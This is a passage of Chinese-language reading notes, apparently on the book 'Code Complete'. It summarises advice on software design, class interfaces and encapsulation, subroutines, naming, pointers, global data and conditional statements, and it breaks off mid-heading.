软件构架中的设计</h2><p><strong>软件的首要技术使命：管理复杂度。</strong></p><h3 id="理想的设计特征"><a href="#理想的设计特征" class="headerlink" title="理想的设计特征"></a>理想的设计特征</h3><ul><li>最小的复杂度</li><li>易于维护</li><li>松散耦合</li><li>可扩展性（增强系统的功能而无需破坏其他底层结构）</li><li>可重用性</li><li>高扇入（大量的类使用该类）</li><li>低扇出（一个类中少量使用其他类）</li><li>可移植性</li><li>精简性</li><li>层次性</li><li>标准技术</li></ul><p>举例来说，在图 5-3 中，你把一个系统划分成 6 个子系统。在没有定义任何规则时，热力学第二定律就会发生作用，整个系统的熵将会增加。熵之所以增加的一种原因是，如果不对子系统间的通信加以任何限制，那么它们之间的通信就会肆意地发生，如图 5-4 所示。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7fahb13zij30ee0gcq72.jpg" alt=""></p><p>你可以把子系统间的连接当做水管。当你想去掉某个子系统时，势必会有不少水管连在上面。你需要断开再重新连接的水管数量越多，弄出来的水就会越多。你肯定想把系统的架构设计成这样：如果想把某个子系统取走重用时，不用重新连接太多水管，重新连接起来也不会太难。</p><p>有先见之明的话，所有这些问题就不会花太多额外的功夫。只有当“确需了解”——最好还有合理的理由——时，才应该允许子系统间的通信。如果你还拿不准该如何设计的话，那么就应该先对子系统之间的通信加以限制，等日后需要时再放开，这要比先不限制，等子系统间已经有了上百个调用时再加以限制要容易得多。图 5-5 展示了施加少量通信规则后可以把图 5-4 中的系统变成的样子：<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7faopuc5gj30g6080gne.jpg" alt=""></p><h3 id="使用对象进行设计的步骤"><a href="#使用对象进行设计的步骤" class="headerlink" title="使用对象进行设计的步骤"></a>使用对象进行设计的步骤</h3><ol><li>辨识对象及其属性（方法和数据）</li><li>确定可以对各个对象进行的操作</li><li>确定各个对象能对其他对象进行的操作</li><li>确定对象的哪些部分对其他对象可见——哪些部分可以是公用（<code>public</code>）的，哪些部分应该是私用（<code>private</code>）的</li><li>定义每个对象的公开接口（<code>public interface</code>）</li></ol><h3 id="类的冰山定律"><a href="#类的冰山定律" class="headerlink" title="类的冰山定律"></a>类的冰山定律</h3><p>在设计一个类的时候，一项关键性的决策就是确定类的哪些特性应该对外可见，而那些特性应该隐藏起来。一个类可能有 25 个子程序，但只暴露了其中的 5 个，其余 20 个仅限于在类的内部使用。一个类在内部可能用到了多种数据类型，却不对外暴露有关他们的任何信息。在类的设计中，这一方面也称为“可见性（visibility）”，因为它要确定的就是类的哪些特性对外界是“可见的”或能“暴露”给外界。</p><p>类的接口应该尽可能少地暴露其内部工作机制。类很像冰山：八分之七都是位于水面之下，而你只能看到水面上的八分之一。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7fastbxnmj308w066t8w.jpg" alt=""></p><h3 id="如何应对变化"><a href="#如何应对变化" class="headerlink" title="如何应对变化"></a>如何应对变化</h3><p>一个优秀的设计师应该有对变化的预期能力，好的程序设计所面临的最重要挑战之一就是适应变化。目标应该是把不稳定的区域隔离出来，从而把变化所带来的影响限制在一个子程序、类或者包的内部。可采取以下几点措施：</p><ul><li>找出看起来容易变化的项目</li><li>把容易变化的项目分离出来</li><li>把看起来容易变化的项目隔离开来</li></ul><h4 id="合理使用设计模式"><a href="#合理使用设计模式" class="headerlink" title="合理使用设计模式"></a>合理使用设计模式</h4><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>抽象工厂</td><td>通过制定对象组的种类而非单个对象的类型来支持创建一组相关的对象</td></tr><tr><td>适配器</td><td>把一个类的接口转变成另一个接口</td></tr><tr><td>桥接</td><td>把接口和现实分离开来，使他们可以独立的变化</td></tr><tr><td>组合</td><td>创建一个包含其他同类对象的对象，使得客户代码可以与最上层对象交互而无须考虑所有的细节对象</td></tr><tr><td>装饰器</td><td>给一个对象动态地添加职责，而无须为了每一种可能的职责配置情况去创建特定的子类（派生类）</td></tr><tr><td>外观</td><td>为没有提供一致接口的代码提供一个一致的接口</td></tr><tr><td>工厂方法</td><td>做特定基类的派生类的实例化时，除了在工厂方法内部之外均无须了解各派生对象的具体类型</td></tr><tr><td>迭代器</td><td>提供一个服务对象来顺序地访问一组元素中的各个元素</td></tr><tr><td>观察者</td><td>使一组相关对象相互同步，方法是让另一个对象负责：在这组对象中的任何一个发生改变时，由它把这种变化通知给这个组里的所有对象</td></tr><tr><td>单例</td><td>为有且仅有一个实例的类提供一种全局访问功能</td></tr><tr><td>策略</td><td>定义一组算法或者行为，使得他们可以动态地相互替换</td></tr><tr><td>模板方法</td><td>定义一个操作的算法结构，但是把部分实现的细节留给子类（派生类）</td></tr></tbody></table><h4 id="合作的方式"><a href="#合作的方式" class="headerlink" title="合作的方式"></a>合作的方式</h4><p>在设计过程中，三个臭皮匠赛过诸葛亮，而不论组织形式的正式与否。合作可以以下面任意一种方式展开。</p><ul><li>你随便走到一名同事的办公桌前，向他征求一些意见</li><li>你和同事坐在会议室里，在白板上画出可选的设计方案</li><li>你和同事在电脑前用编程语言做出详细的设计，换言之，你们可以采用结对编程（第 21 章“协同构建”中对结对编程有描述）</li><li>你约一名或多名同事来开会，和他们过一遍你的设计和想法</li><li>你按照第 21 章中给出的结构来安排一次正式检查</li><li>你身边没有人能检查你的工作，因此当你做完一些初始工作后，把它们全放进抽屉，一周后再来回顾。这时你会把该忘的都忘了，正好给自己做一次不错的检查</li><li>你向公司外的人求助：如论坛或交流群</li></ul><h2 id="第6章-可以工作的类"><a href="#第6章-可以工作的类" class="headerlink" title="第6章 可以工作的类"></a>第6章 可以工作的类</h2><p>创建高质量的类，第一步，可能也是最重要的一步，就是<font color='red'><strong>创建一个好的接口</strong></font>。这也包括了创建一个可以通过接口来展现的合理的抽象，并确保细节仍被隐藏在抽象背后。<br>类接口的抽象能力非常有价值，因为<em>接口中的每个子程序都在朝着这个一致的目标而工作</em>。</p><p>创建接口的建议</p><ul><li>类的接口应该展现一致的抽象层次</li><li>一定要理解类所实现的抽象是什么</li><li>提供成对的服务（如，开和关，增和减）</li><li>把不相关的信息转移到其他类中</li><li>尽可能让接口编程，而不是语义编程</li><li>谨防在修改时破坏接口的抽象</li><li>不要添加与接口抽象不一致的公用成员</li><li>同时考虑抽象性和内聚性</li></ul><h3 id="良好的封装"><a href="#良好的封装" class="headerlink" title="良好的封装"></a><font color='red'>良好的封装</font></h3><ul><li><font color='red'>尽可能地限制类和成员的可访问性</font></li><li><font color='red'>不要公开暴露成员数据（通过<code>set()</code>和<code>get()</code>获取）</font></li><li><font color='red'>避免把私用的实现细节放入类的接口中</font></li><li><font color='red'>不要对类的使用者做出任何假设（如，请初始化x, y为0 1，否则程序会崩溃）</font></li><li><font color='red'>不要因为一个子程序里仅使用公用子程序，就把它归入公开接口</font></li><li><font color='red'>让阅读代码比编写代码更方便</font></li><li><font color='red'>要格外警惕语义上破坏封装性（语法上只需要将方法设为<code>private</code>，而语义上则需要注意不要再次调用已经初始化中完成的方法）</font></li><li><font color='red'>留意过于紧密的耦合关系（良好的类应该是黑盒子，而不是玻璃盒子）</font></li></ul><p><strong>警惕有超过7个数据成员的类</strong>。研究表明，人们在做其他事情时能记住的离散项目的个数是<code>7±2</code></p><p>使用继承时，需要考虑：</p><ol><li>该方法是否对子类可见，是否可被重写</li><li>该类属性是否对子类可见及重写</li></ol><p>关于类的一些说明</p><ul><li>要么使用继承并进行详细说明，要么就不要用它</li><li>遵循里氏替换原则：派生类必须能通过基类的接口而被使用，且使用者无需了解两者间的差异</li><li>把共用的接口，数据及操作放到继承树中尽可能高的位置</li><li>只有一个实例的类是值得怀疑的</li><li>只有一个派生类的基类也值得怀疑。不要创建任何并非绝对必要的继承结构</li><li>派生后覆盖了某个子程序，但在其中没有做任何操作</li><li>避免让继承体系过深。继承不要超过3层，基类的派生总数不要超过7±2。过深的继承会显著导致错误率的增长。过深的继承层次增加了复杂度，而这恰恰与继承所应解决的问题相反，请确保你在用继承来避免代码重复并使复杂度最小</li><li>尽量使用多态，避免大量的类型检查</li><li>让所有数据都是<code>private</code></li></ul><p>使用类时需要注意的</p><ul><li>如果多个类共享数据而非行为，应该创建这些类可以包含的共用对象</li><li>如果多个类共享行为而非数据，应该让它们从共同的基类继承而来，并在基类里定义共用的子程序</li><li>如果多个类既共享数据也共享行为，应该让它们从一个共同的基类而来，并在基类里定义共用的数据和子程序</li><li><font color='red'>让类中子程序的数量尽可能少。类中子程序越多，出错的概率也越高</font></li><li>禁止隐式地产生你不需要的成员函数和运算符。如构造方法产生的内容</li><li><font color='red'>减少类所调用的不同子程序的数量。同样的，数量越多，越容易出错</font></li><li><font color='red'>对其他类的子程序的间接调用要尽可能的少</font>。即A对象可以任意调用自己的所有子程序，如果A对象创建了一个B对象，也可以 调用任意B对象中的公用子程序，但它应该避免再调用B对象中其他对象的子程序（尽量减少依赖关系）</li><li>尽量减少类与类之间相互合作的范围</li></ul><p>封装是一个比抽象更强的概念。抽象通过提供一个可以让你忽略实现细节的模型来管理复杂度，而封装则强制阻止你看到细节——即便你想这么做。</p><p>成为高效程序员的一个关键就在于，当你开发程序任一部分代码时，都能安全地忽视程序中尽可能多的其余部分。而类就是实现这一目标的首要工具。</p><p>为未来要做的工作着手进行准备的最好方法，并不是去创建几层额外的、“没准以后哪天就能用得上的”基类，而是让眼下的工作成果尽可能地清晰、简单、直截了当。也就是说，不要创建任何非绝对必要的继承结构。</p><p>创建类的原因</p><ul><li>为现实世界中的对象建模</li><li>为抽象的对象建模</li><li><font color='red'>降低复杂度</font></li><li>隔离复杂度。如果在类中出现了错误，只要它还在类的局部而未扩散到其他代码，只需要修改一个地方即可</li><li>隐藏实现细节</li><li>限制变动的影响范围。把经常变动的部分隔离起来，这样就能把变动带来的影响限制在一个或几个类的范围内</li><li>隐藏全局数据。与直接使用全局数据相比，通过访问类的方法来操作全局数据更有好处</li><li>让参数传递更顺畅</li><li>建立中心控制点</li><li>让代码更易于重用</li><li>为程序族做计划</li><li>把相关操作包装到一起</li><li>实现某种特定的重构</li></ul><p>应该避免的类</p><ul><li>避免创建万能类</li><li>消除无关紧要的类。如果一个类只包含数据但不包含行为的话，就应该认真考虑一下它是一个类吗？同时应该考虑把这个类降级，让它的数据成员成为一个或多个其他类的属性</li><li>避免用动词命名的类。只有行为而没有数据的类往往不是真正的类</li></ul><p>本章要点总结：</p><ul><li>类的接口应提供一致的抽象。很多问题都是由于违背该原则而引起的。</li><li>类的接口应隐藏一些信息——如某个系统接口、某项设计决策、或一些实现细节。</li><li>包含往往比继承更为可取——除非你要对 “是一个/is a” 的关系建模</li><li><font color='red'>继承是一种有用的工具，但它却会增加复杂度，这有违于软件的首要技术使命——管理复杂度</font></li><li>类是管理复杂度的首选工具。要在设计类时给予足够的关注，才能实现这一目标。</li></ul><h3 id="本章知识点复习"><a href="#本章知识点复习" class="headerlink" title="本章知识点复习"></a>本章知识点复习</h3><p>抽象数据类型</p><ul><li>你是否把程序中的类都看作是抽象数据类型了？是否从这个角度评估它们的接口了？</li></ul><p>抽象</p><ul><li>类是否有一个中心目的？</li><li>类的命名是否恰当？其名字是否表达了其中心目的？</li><li>类的接口是否展现了一致的抽象？</li><li>类的接口是否能让人清楚明白地知道该如何使用它？</li><li>类的接口是否足够抽象，使你能不必顾虑它是如何实现其服务的？你能把类看做黑盒吗？</li><li>类提供的服务是否足够完整，能让其他类无须修改其内部数据</li><li>是否已从类中去除无关信息？</li><li>是否考虑过把类进一步分解为组件类？是否已尽可能将其分解？</li><li>在修改类时是否维持了其接口的完整性？</li></ul><p>封装</p><ul><li>是否把类的成员的可访问性降到最小？</li><li>是否避免暴露类中的数据成员？</li><li>在编程语言所许可的范围内，类是否已尽可能地对其他的类隐藏了自己的实现细节？</li><li>类是否避免对其他使用者，包括其派生类会如何使用它做了假设？</li><li>类是否不依赖于其他类？它是松散耦合的吗？</li></ul><p>继承</p><ul><li>继承是否只用来建立“是一个/is a”的关系？也就是说，派生类是否遵循 LSP（里氏替换原则）？</li><li>类的文档中是否记述了其继承策略？</li><li>派生类是否避免了“覆盖”不可覆盖的方法？</li><li>是否把公用的接口、数据和行为都放到尽可能高的继承层次中了？</li><li>继承层次是否很浅？</li><li>基类中所有的数据成员是否都被定义为<code>private</code>而非<code>protected</code>的了？</li></ul><p>跟实现相关的其他问题</p><ul><li>类中是否只有大约 7 个或更少的数据成员？</li><li>是否把类直接或间接调用其他类的子程序的数量减到最少了？</li><li>类是否只在绝对必要时才与其他的类相互协作？</li><li>是否在构造函数中初始化了所有的数据成员？</li><li>除非拥有经过测量的、创建浅层副本的理由，类是否都被设计为当做深层副本使用？</li></ul><p>与语言相关的问题</p><ul><li>你是否研究过所用编程语言里和类相关的各种特有问题？</li></ul><h2 id="第7章-高质量的子程序"><a href="#第7章-高质量的子程序" class="headerlink" title="第7章 高质量的子程序"></a>第7章 高质量的子程序</h2><h3 id="子程序应该有"><a href="#子程序应该有" class="headerlink" title="子程序应该有"></a>子程序应该有</h3><ol><li>望文知义的名字</li><li>详细的说明注释</li><li>良好的代码布局</li><li>单一而明确的目的</li><li>合理的参数个数（7个以内）</li><li>防范式编程</li></ol><p>为什么要创建子程序？</p><ol><li>降低复杂度</li><li>避免代码重复。如果在两段子程序内编写相似的代码，就意味着代码分解有问题，此时应该把两段子程序中相同部分放入一个基类，再把不同部分放入派生类中。或者将相同部分封装为一个方法</li><li>支持子类化</li><li>隐藏顺序</li><li>隐藏指针操作</li><li>提高可移植性</li><li>简化复杂的布尔判断</li><li>改善性能。一处优化，处处调用受益</li><li>确保所有的子程序都最小</li></ol><p><font color='red'>编写有效的子程序时，一个最大的心里障碍是不情愿为了一个简单的目的而编写一个简单的子程序，写一个只有两三行代码的子程序可能看起来有些大材小用，但一个小的子程序既能够提高代码的可读性，又能在未来在『简单的操作常常会变成复杂操作』时更好维护。</font></p><p>功能的内聚性是最强也是最好的一种内聚性，也就是让一个子程序仅执行一项操作。</p><p>不良的内聚性包括：</p><ol><li>过程上的内聚性。即根据业务流程来书写的子程序</li><li>逻辑上的内聚性。即若干操作被放在同一个子程序中，通过传入不同的控制标志来选择执行其中的一项操作，这样的子程序可以优化为一个子程序代码仅由一系列 if 或 else 以及调用其他子程序的语句组成，那么这样一个逻辑上的内聚性的子程序通常也是可以的。这种情况下，子程序的唯一功能就是发布命令，其自身并不做任何处理，这种子程序被称为事件处理器</li><li>巧合的内聚性。指子程序各操作间没有任何可以看到的关联</li></ol><p><font color='red'>如果一个子程序具有不良的内聚性，那最好还是花功夫重新编写，使其具有更好的内聚性，而不是再去花精力精确地诊断问题所在了。</font></p><p>与其限制子程序的长度，不如让以下因素——内聚性，嵌套的层次，变量的数量，决策点的数量，解释子程序的注释及其他一些和复杂度相关的考虑——来决定子程序的长度。但子程序的长度尽量控制在200行以内，</p><p>子程序参数应该按照“输入-修改-输出”的顺序排列参数。即先列出仅作为输入用途的参数，然后是既作为输入又作为输出用途的参数，最后才是仅作为输出用途的参数。</p><p><font color='red'>如果几个子程序都用了类似的一些参数，应该让这些参数的排列顺序保持一致，以便于记忆。反例：php中的 <code>array_map()</code> 和 <code>array_walk()</code></font></p><p><font color='red'>把子程序的参数个数限制在7个以内。</font></p><p>函数是指有返回值的子程序，过程是指没有返回值的子程序</p><p>确保函数无意外的返回值。可以在函数开头设置默认值来避免这一风险。</p><p>不要返回指向局部数据的指针或引用。</p><blockquote><p>好的子程序注释应该只用于说明参数，而非业务逻辑。如果需要在注释中说明了你做了什么，要么是你写的太过于复杂，要么产品经理该炒掉。</p></blockquote><h3 id="子程序命名"><a href="#子程序命名" class="headerlink" title="子程序命名"></a>子程序命名</h3><p>好的子程序名能清晰地描述子程序所做的一切。这里是有效的给子程序命名的一些指导原则：</p><ul><li>描述子程序所做的所有事情</li><li>避免使用无意义的、模糊或表述不清的动词<ul><li>错误的命名：<code>HandleCalculation()</code>, <code>PerformServices()</code>, <code>OutputUser()</code>, <code>ProcessInput()</code>, <code>DelWithOutput()</code></li><li>正确的命名：<code>HandleOutput()</code> ===&gt; <code>FormatAndPrintOutPut()</code></li></ul></li><li>不要仅通过数字来形成不同的子程序名字</li><li>根据需要确定子程序名字长度<ul><li>研究表明，变量名的最佳长度是 9~15 个字符。子程序通常比变量更为复杂，因此，好的子程序名字通常也会更长一些。另一方面，子程序名字通常是跟在对象名字之后，这实际上为其免费提供了一部分名字。总的来说，给子程序命名的重点是尽可能含义清晰，也就是说，子程序名的长短要视该名字是否清晰易懂而定。</li></ul></li><li>给函数命名时要对返回值有所描述</li><li>给过程起名时使用语气强烈的动词加宾语的形式</li><li>准确使用对仗词<ul><li>add/remove</li><li>begin/end</li><li>create/destroy</li><li>first/last</li><li>get/put</li><li>get/set</li><li>increment/decrement</li><li>insert/delete</li><li>lock/unlock</li><li>mix/max</li><li>next/previous</li><li>old/new</li><li>open/close</li><li>show/hide</li><li>source/target</li><li>start/stop</li><li>up/down</li></ul></li><li>为常用操作确立命名规则</li></ul><h2 id="第8章-防范式编程"><a href="#第8章-防范式编程" class="headerlink" title="第8章 防范式编程"></a>第8章 防范式编程</h2><p>在防御式驾驶中要建立这样一种思维，那就是你永远也不能确定另一位司机将要做什么。这样才能确保在其他人做出危险动作时你也不会受到伤害。你要承担起保护自己的责任，哪怕是其他司机犯的错误。防御式编程的主要思想是：子程序应该不因传入错误数据而被破坏，哪怕是由于其他子程序产生的错误数据。</p><p>如何做到防范式编程？</p><ul><li>检查所有来源于外部的数据值</li><li>检查内部程序的传入参数</li><li>决定如何处理错误的输入数据</li></ul><h2 id="第9章-伪代码编程过程"><a href="#第9章-伪代码编程过程" class="headerlink" title="第9章 伪代码编程过程"></a>第9章 伪代码编程过程</h2><p>伪代码能让你从更宏观的层次了解你即将编写的项目，划定你的开发计划，避免在开发途中逐渐偏离主航道。同时，伪代码也能较为清晰的看出设计方案的缺陷，让错误及早发现和纠正。</p><p>请在确信代码是正确的时候执行，避免先东拼西凑，然后通过运行来查看代码是否正常的怪圈，这种方式总是让你花费更多的时间。</p><h2 id="第10章-使用变量的一般事项"><a href="#第10章-使用变量的一般事项" class="headerlink" title="第10章 使用变量的一般事项"></a>第10章 使用变量的一般事项</h2><ul><li>在靠近第一次使用的位置声明和初始化变量</li><li>特别注意计数器和累加器<code>i、j、k、sum</code>和<code>total</code>等变量常用做计数器或累加器，在下一次使用这些变量前忘记重置其值也是一种常见错误。</li><li>在类的构造函数中初始化该类的数据成员</li><li>检查是否需要重新初始化，比如<code>foreach</code>循环中的值</li><li>检查输入参数的合法性</li><li>尽可能将变量的引用集中起来，以提高程序的可读性</li><li>开始时采用最严格的可见性，然后根据需要扩展变量的作用域。把一个<code>protected</code>数据转换为<code>private</code>难度比反向要大，因此应该选择变量所能具有的最小的作用域。</li><li><strong>应该把每个变量定义成只对需要看到它的、最小范围的代码段可见</strong>。如果能把变量的作用于限定到一个单独的循环或者子程序，那最好不过了。如果你无法把作用域限定在一个子程序里，那就把可见性限定到某个类内部的子程序。如果无法你把变量的作用域限定在最该变量承担的最主要的责任的那个类里面，那么就创建一些访问器子程序来让其他类共享该变量的数据。</li><li>每个变量只用于单一用途，且变量含义明确</li></ul><p>减小作用域的一般原则</p><ul><li>在循环开始之前再去初始化该循环里使用的变量，而不是在该循环所属的子程序的开始处初始化这些变量</li><li>直到变量即将被使用时再为其赋值</li><li>把相关语句放到一起</li><li>把相关语句组提取成单独的子程序</li></ul><h2 id="第11章-变量名的力量"><a href="#第11章-变量名的力量" class="headerlink" title="第11章 变量名的力量"></a>第11章 变量名的力量</h2><p>为变量命名时最重要的考虑事项是：该名字要完全、准确地描述出该变量所代表的事物。通常，对变量的描述就是最佳的变量名，这种名字很容易阅读，而且没有歧义。</p><p><strong>变量名长度在12个左右为宜。</strong></p><p>取变量名时，应该以问题为导向，如一条员工的记录可以称作<code>inputRec</code>或<code>employeeData</code>，前者反映的是输入、记录这些计算概念的计算机术语，后者则直指问题领域，与计算机世界无关。当表示一个打印机状态的位域时，<code>bitFlag</code> 要比 <code>printerReady</code>更具有计算机特征。</p><h3 id="变量名中的计算值限定词"><a href="#变量名中的计算值限定词" class="headerlink" title="变量名中的计算值限定词"></a>变量名中的计算值限定词</h3><p>很多程序都有表示计算结果的变量：总额、平均值、最大值等等。如果你要用类似于 Total、Sum、Average、Max、Min、Record、String、Pointer 这样的限定词来修改某个名字，那么请记住把限定词加到名字的最后。</p><p>这种方法有狠毒偶有点。首先，变量名中最终的那部分，即为这一变量赋予主要含义的部分应当位于最前面，这样，这一部分就可以显得最为突出，炳辉被首先阅读到。其次，采纳了这一规则，你将避免由于同时在程序中使用 totalRevenue 和 revenueTotal 而产生的歧义。这些名字在语义上是等价的，上述规则可以避免将他们当做不同的东西使用。还有，类似 revenueTotal、expenseTotal、revenueAverage、expenseAverage 这组名字的变量具有非常优雅的对称性。而从 totalRevenue、expenseTotal、revenueAverage、averageExpense 这组名字中则看不出什么规律来。总之，一致性可以提高可读性，简化维护工作。</p><p>把计算的量放在名字最后的这条规则也有例外，那就是 Num 限定词的位置已经是约定俗成的。Num 放在变量名的开始位置代表一个总数：numCustomers 表示的是员工的总数。Num 放在变量名的结束位置代表一个下标：customerNum 表示的是当前员工的序号。通过 numCustomers 最后代表复数的 s 也能看出这两种应用之间的区别。然而，由于这样使用的 Num 常常会带来麻烦，因此可能最好的办法是避开这些问题，用 Count 或 Total 来代表员工的总数，用 Index 来指代某个特定员工。这样，customerCount 就代表员工的总数，customerIndex 代表某个特定的员工。</p><h3 id="变量中常用的对仗词"><a href="#变量中常用的对仗词" class="headerlink" title="变量中常用的对仗词"></a>变量中常用的对仗词</h3><ul><li>begin/end</li><li>first/last</li><li>locked/unlocked</li><li>min/max</li><li>next/previous</li><li>old/new</li><li>opened/closed</li><li>visible/invisible</li><li>source/target</li><li>source/destination</li><li>up/down</li></ul><h2 id="第12章-基本数据类型"><a href="#第12章-基本数据类型" class="headerlink" title="第12章 基本数据类型"></a>第12章 基本数据类型</h2><p><strong>避免使用“神秘数值”</strong>。神秘数值会导致无法望文知意，相同数值在不同位置含义不同等问题，而使用具名常量来替代则会让代码维护起来更轻松。一条很好的经验法则是：<strong>程序主体中仅能出现的数值就是 0 和 1。任何其他数值都应该转换为具名常量</strong>。如订单状态等场景。</p><p>用枚举类型来提高可读性与可靠性，如<code>chosenColor = 1</code>用<code>chosenColor = Color_Red</code>来替代会更清晰、准确。</p><h2 id="第13章-不常见的数据类型"><a href="#第13章-不常见的数据类型" class="headerlink" title="第13章 不常见的数据类型"></a>第13章 不常见的数据类型</h2><h3 id="关于指针"><a href="#关于指针" class="headerlink" title="关于指针"></a>关于指针</h3><p>如何解释内存中某个位置的内容，是由指针的基类型(base type)决定的。如果某指针指向整数，这就意味着编译器会把该指针所指向内存位置的数据解释为一个整数。当然，你可以让一个整数指针、一个字符串指针和一个浮点数指针都指向同一个内存位置，但其中（最多）只有一个指针能正确地解释该位置的内容。</p><h3 id="使用指针的一般技巧"><a href="#使用指针的一般技巧" class="headerlink" title="使用指针的一般技巧"></a>使用指针的一般技巧</h3><p>对解决很多类型的程序错误来说，最容易的一部分是定位错误，而难的是更正错误。然而指针错误的情况则有所不同。通常，指针错误都产生于指针指向了它不应该指向的位置。当你通过一个坏了的指针变量赋值时，会把数据写入本不该写值的内存区域。这称为“内存破坏”。有时内存破坏会导致可怕、严重的系统崩溃：有时它会篡改程序其他部分的计算结果。有时它会只是你的程序不可预知地跳过某些子程序；而有时候它又什么事情都不做。在最后一种情况下，这种指针错误就像一颗滴答作响的定时炸弹，等着你把程序演示给最重要客户的前 5 分钟时引爆。指针错误的症状常常与引起指针错误的原因无关。因此，更正指针错误的大部分工作量便是找出它的位置。</p><p>正确地使用指针要求程序员采用一种双向策略。第一，要首先避免造成指针错误。指针错误很难发现，因此采取一些预防性措施是值得的。其次，在编写代码之后尽快地检测出指针错误来。指针错误的症状飘忽不定，采取一些额外措施来使得这些症状可被预测是非常值得的。</p><ul><li>把指针操作限制在子程序或者类里面。如不要通过手动操作指针去宾利链表，应该编写一组诸如<code>NextLink()</code>、<code>PreviousLink()</code>、<code>InsertLink()</code>、<code>DeleteLink()</code>这样的访问器子程序来完成操作更好些。</li><li>同时声明和定义指针。在靠近变量声明的位置为该变量赋初始值通常是一项好的编程实践。</li><li>在与指针分配相同的作用域中删除指针</li><li>在使用指针之前检查指针</li><li>先检查指针所引用的变量在使用它</li><li>用狗牌字段来检测损毁的内存。标记字段（tag flag）或者狗牌（dog tag）是指你加入结构体内的一个仅仅用于检测错误的字段。在分配一个变量的时候，把一个应该保持不变的数值放在它的标记字段里。当你使用该结构的时候——特别是当你释放其内存的时候——检测这个标记字段的取值。如果这个标记字段的取值与预期不符，那么这个数据就被破坏了。在删除指针的时候，就破坏这个字段。把狗牌放置在你所分配的内存区域的开始位置，让你能检查是否多执行了释放该内存的操作，而无需去维护一个包含你所分配的全部内存区域的列表。把狗牌放置在内存区域的后面，让你能检查是否做过超出该内存块末位的覆盖数据操作。你可以同时在前面和后面放狗牌，以便同时达到上述两个目的。</li><li>增加明显的冗余。另一种代替标记字段的方案，就是某些特定字段重复两次。如果位于冗余字段中的数据不匹配，你就可以确定数据已经被破坏了。如果你直接操作指针，这么做会带来很高的成本。然而，如果你把指针操作限制在子程序里面，那么就只需要少数几处重复的代码。</li><li>用额外的指针变量来提高代码清晰度。一定不要节约使用指针变量，即不要把同一个变量用于多种用途。这一点对指针变量来说尤为重要。</li><li>简化复杂的指针表达式</li><li>画一个图</li><li>按照正确的顺序删除链表中的指针。在使用动态分配链表时，经常遇到的一个问题是，如果先释放了链表中的第一个指针，就会导致下一个指针无法访问。为了避免这一问题，在释放当前指针前，要确保已经有指向链表中下一个元素的指针。</li><li>分配一片保留的内存后备区域。如果在你的程序中使用了动态内存，就需要避免发生程序内存忽然被耗尽、用户和数据被丢在 RAM 里的尴尬场景。</li><li>粉碎垃圾数据</li><li>在删除或者释放指针之后把它们设置为空值</li><li>在删除变量之前检查非法指针</li><li>跟踪指针分配情况</li><li>编写覆盖子程序，集中实现避免指针问题的策略</li><li>采用非指针技术</li></ul><h3 id="全局数据"><a href="#全局数据" class="headerlink" title="全局数据"></a>全局数据</h3><p><strong>使用全局数据的风险比使用局部数据大。</strong></p><p>使用全局数据的一些问题：</p><ul><li>无意间修改了全局数据</li><li>在多个线程运行时全局数据保证不会被修改</li><li>阻碍代码复用。将A程序代码移植到B代码需要一并移植A的全局数据。</li><li>全局数据破坏了模块化和智力上的可管理性。创建超过几百行代码的程序的核心便是管理复杂度。你能够在智力上管理一个大型程序的唯一方法就是把它拆分成几部分，从而可以只在同一时间只考虑一部分。模块化就是你手中可以使用的最强大的工具。全局数据使得你的模块化大打折扣。如果你使用了全局数据，你不得不关注一个子程序，以及使用了同样全局数据的其他所有子程序。尽管全局数据并没有完全破坏模块化，但却削弱了它。</li></ul><p><strong>只有万不得已的时候才使用全局数据。</strong></p><p>当使用全局数据时，一个好的习惯是，将所有全局数据都冠以<code>_g</code>前缀，并且用访问器子程序来管理全局数据，除了该变量的访问器子程序以外，所有的代码都不可以访问<code>_g</code>前缀的变量。其他代码均通过访问器子程序来存取该数据。另外，全局数据再设置时，先将每个变量设置为局部变量，仅当必须时再修改为全局。犹如类中先设为<code>private</code>，再设为<code>public</code>。</p><p>不要把所有的全局数据扔在一起。如果把所有的全局数据都堆在一起，然后为它编写一些访问器子程序，你可以消灭所有与全局数据有关的问题，但这也使代码丧失了信息隐藏和抽象数据类型所带来的好处。既然已经在编写访问器子程序，就请花一些时间考虑每一个全局数据所属的类，然后把该数据和它访问器子程序以及其他数据和子程序打包放入那个类。</p><p>如何解决全局数据再多线程运行时不会被意外修改呢？我们可以通过锁来控制对全局变量的访问。</p><p><strong>在许多情况下，全局数据事实上就是没有设计好或者没有实现好的类中的数据。在少数情况下，一些数据的确需要作为全局数据，但是可以使用访问器子程序对其进行封装，从而最大限度减少发生问题的几率。在剩余的极少数情况下，你真的需要使用全局数据。</strong></p><h2 id="第14章-组织直线型代码"><a href="#第14章-组织直线型代码" class="headerlink" title="第14章 组织直线型代码"></a>第14章 组织直线型代码</h2><p><strong>要让程序易于自上而下阅读，而不是让读者目光跳来跳去。</strong>如果有人在阅读你代码时不得不搜索整个程序来找到所需信息，那么就应该重新组织下你的代码了。</p><p>直线型代码要把相关的语句组织到一起，好的相关代码结构应该像左侧一样，方块间不会有重叠。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872vdz390j30mi0bc0u7.jpg" alt=""></p><h2 id="第15章-使用条件语句"><a href="#第15章-使用条件语句" class="headerlink" title="第15章 使用条件语句"></a>第15章 使用条件语句</h2><h3 id="使用-if-语句时，请遵循下述指导原则"><a href="#使用-if-语句时，请遵循下述指导原则" class="headerlink" title="使用 if 语句时，请遵循下述指导原则"></a>使用 if 语句时，请遵循下述指导原则</h3><ul><li>首先写正常代码逻辑，再处理不常见情况</li><li>确保对于等量判断正确。请不要用<code>&gt;</code>代替<code>&gt;=</code>或用<code>&lt;</code>代替<code>&lt;=</code>，在循环中，要仔细考虑避免犯偏差 1 的错误</li><li>把正常情况的处理放在 if 里而不是在 else 中</li><li>让 if 中跟一个有意义的语句</li><li>考虑是否真的需要 else 语句</li><li>检查 if 与 else 是否弄反了</li></ul><h3 id="使用-if-else-时请注意"><a href="#使用-if-else-时请注意" class="headerlink" title="使用 if-else 时请注意"></a>使用 if-else 时请注意</h3><ul><li>利用布尔函数调用简化复杂的检测</li><li>把最常见的情况放在最前面。易于阅读，执行效率高。</li><li>确保所有的情况都考虑到了</li><li>复杂的 if-else 请使用 case 替代</li></ul><h3 id="使用-case-语句时排序的窍门"><a href="#使用-case-语句时排序的窍门" class="headerlink" title="使用 case 